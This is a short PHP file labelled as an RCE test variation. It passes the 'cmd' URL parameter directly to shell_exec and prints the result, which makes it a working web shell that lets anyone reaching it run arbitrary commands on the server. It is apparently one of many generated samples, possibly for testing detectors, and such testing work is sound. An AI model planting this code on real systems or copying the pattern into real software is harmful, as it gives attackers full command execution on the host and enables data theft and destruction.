<?php
// RCE test variation #918
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>